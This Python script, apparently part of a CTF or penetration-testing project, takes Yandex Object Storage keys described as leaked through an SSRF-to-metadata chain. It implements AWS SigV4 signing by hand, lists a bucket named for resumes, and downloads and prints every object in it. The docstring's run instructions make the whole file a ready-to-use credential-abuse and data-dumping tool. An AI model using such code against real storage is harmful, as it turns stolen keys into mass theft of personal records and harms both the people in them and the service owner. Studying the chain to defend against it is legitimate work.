"""MedHunter — list and dump every object in the leaked S3 bucket.

Approach:
    medhunter_invite's SSRF->IMDS chain leaked long-lived Yandex Object Storage keys
    in the backend's ``.env``. Pass them as ``STORAGE_ACCESS_KEY`` and
    ``STORAGE_SECRET_KEY``; Object Storage
    speaks plain AWS S3 SigV4, so no SDK is needed: this script implements
    the canonical-request/string-to-sign/signing-key chain from scratch
    (``sign``/``sigkey``/``req``), lists ``medhunter-resumes-6d6c314a`` with
    ``GET ?list-type=2``, then ``GET``s every returned key. It doubles as
    confirmation that the leaked credentials work end-to-end and as the
    bridge to medhunter_vip's binary-reverse findings (``incoming/`` prefix,
    ``mhq_v1_`` queue-signing key) that feed medhunter_signature.

Run::

    STORAGE_ACCESS_KEY=... STORAGE_SECRET_KEY=... uv run python medhunter_vip/s3get.py
"""

import datetime
import hashlib
import hmac
import os
import urllib.error
import urllib.request

ACCESS = os.environ.get("STORAGE_ACCESS_KEY")
SECRET = os.environ.get("STORAGE_SECRET_KEY")
if not ACCESS or not SECRET:
    raise SystemExit("set STORAGE_ACCESS_KEY and STORAGE_SECRET_KEY from the medhunter_invite leak")
REGION = "ru-central1"
HOST = "storage.yandexcloud.net"
SERVICE = "s3"


def sign(k, m):
    return hmac.new(k, m.encode(), hashlib.sha256).digest()


def sigkey(k, d, r, s):
    kd = sign(("AWS4" + k).encode(), d)
    kr = sign(kd, r)
    ks = sign(kr, s)
    return sign(ks, "aws4_request")


def req(bucket, key="", params=""):
    method = "GET"
    canonical_uri = "/" + key
    host = f"{bucket}.{HOST}"
    now = datetime.datetime.now(datetime.UTC)
    amzdate = now.strftime("%Y%m%dT%H%M%SZ")
    datestamp = now.strftime("%Y%m%d")
    ph = hashlib.sha256(b"").hexdigest()
    ch = f"host:{host}\nx-amz-content-sha256:{ph}\nx-amz-date:{amzdate}\n"
    sh = "host;x-amz-content-sha256;x-amz-date"
    cr = f"{method}\n{canonical_uri}\n{params}\n{ch}\n{sh}\n{ph}"
    scope = f"{datestamp}/{REGION}/{SERVICE}/aws4_request"
    sts = f"AWS4-HMAC-SHA256\n{amzdate}\n{scope}\n" + hashlib.sha256(cr.encode()).hexdigest()
    k = sigkey(SECRET, datestamp, REGION, SERVICE)
    sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
    auth = f"AWS4-HMAC-SHA256 Credential={ACCESS}/{scope}, SignedHeaders={sh}, Signature={sig}"
    url = f"https://{host}/{key}" + ("?" + params if params else "")
    r = urllib.request.Request(
        url, headers={"Authorization": auth, "x-amz-date": amzdate, "x-amz-content-sha256": ph}
    )
    try:
        return urllib.request.urlopen(r, timeout=20).read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}: " + e.read().decode(errors="replace")[:300]


if __name__ == "__main__":
    import re

    lst = req("medhunter-resumes-6d6c314a", "", "list-type=2")
    keys = re.findall(r"<Key>([^<]+)</Key>", lst)
    print("KEYS:", len(keys))
    for kk in keys:
        body = req("medhunter-resumes-6d6c314a", kk)
        print("=" * 60)
        print(kk)
        print(body[:900])
